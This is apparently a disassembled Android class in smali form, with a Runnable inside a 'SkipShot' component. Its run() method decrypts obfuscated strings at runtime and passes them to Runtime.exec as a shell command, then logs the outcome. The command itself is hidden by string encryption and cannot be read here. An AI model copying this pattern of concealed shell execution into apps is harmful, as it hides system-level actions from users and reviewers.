.class Lcom/zjx/gw2lic/SkipShot$3;
.super Ljava/lang/Object;
.source "SkipShot.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/zjx/gw2lic/SkipShot;->ensurePolicy()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .line 103
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    .line 107
    const-string v0, "\u001d\u0090\u0006\u00f2E2\u00b8"

    invoke-static/range {v0 .. v0}, Lcom/zjx/buildtier/Sx;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    const-string v2, ")\u00b2"

    invoke-static/range {v2 .. v2}, Lcom/zjx/buildtier/Sx;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "w\u00a4"

    invoke-static/range {v3 .. v3}, Lcom/zjx/buildtier/Sx;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ")\u00a2@\u00d5g\u0015\u008f&\u00e2_\u00e9}V\u0084<\u00d2H\u00f6hQ\u00b6\"\u00dcA\u00f7\u00913\u00b86\u00da\u007f\u00fd\u0095\u000b\u00bd\"\u00d7;\u00b9\u00ceB\u00bcY\u00ddb\u00ea\u009e:\u00b9\u0017\u00d4d\n\u00cb?\u00a9]\u00fdm\u0015\u00c6;\u00a9I\u00feb\u001a\u00be/\u00cbA\u00car\u0000\u00b0 \u00d5Z\u00cf\u008d\u0018\u00b2\u001b\u00c1A\u00ea\u0088\u0015\u00a1\u001f\u009d\"\u00a6\u0080\u0005\u00b9N\u00cez\u00e6\u009d{\u00b8@\u00d6/\u001b\u00859\u00a1Q\u00f1*\u001f\u008d5\u00daN\u00f6Z\u0013\u00af%\u00e6V\u00fcl\u0004\u00b9>\u00ebQ\u00d1\u009a\u0018\u00a51\u008f-"

    invoke-static/range {v4 .. v4}, Lcom/zjx/buildtier/Sx;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    filled-new-array {v2, v3, v4}, [Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 111
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I

    .line 112
    const-string v1, "?\u00a9G\u00d4|\u001e\u00b8:\u00aeF\u00ffpL\u00c38\u00d4N\u00f3a\u001f\u0081*\u00c8L\u00cd\u008f\u0003\u00b5/\u00d0Y\u00ad\u0089\u0002\u00a0a\u00d8r\u00e9\u00d5\u0011\u00ba"

    invoke-static/range {v1 .. v1}, Lcom/zjx/buildtier/Sx;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_0

    :catchall_0
    move-exception v1

    .line 114
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "?\u00a9G\u00d4|\u001e\u00b8:\u00aeF\u00ffpV\u00a5\u0011\u00f4f\u00d2@K\u00fe"

    invoke-static/range {v3 .. v3}, Lcom/zjx/buildtier/Sx;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method
